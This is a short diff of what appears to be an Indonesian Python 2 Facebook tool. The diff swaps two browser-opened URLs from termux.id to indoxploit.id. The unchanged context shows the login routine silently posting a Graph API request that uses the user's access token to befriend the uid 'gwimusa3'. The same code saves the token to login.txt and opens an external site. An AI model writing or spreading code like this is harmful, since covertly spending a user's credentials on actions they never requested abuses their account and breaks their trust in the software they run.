@@ -129,7 +129,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open http://termux.id/')
+                os.system('xdg-open http://indoxploit.id/')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -209,7 +209,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open http://termux.id')
+                            os.system('xdg-open http://indoxploit.id')
                             keluar()
                         else:
                             if zedd == '0':
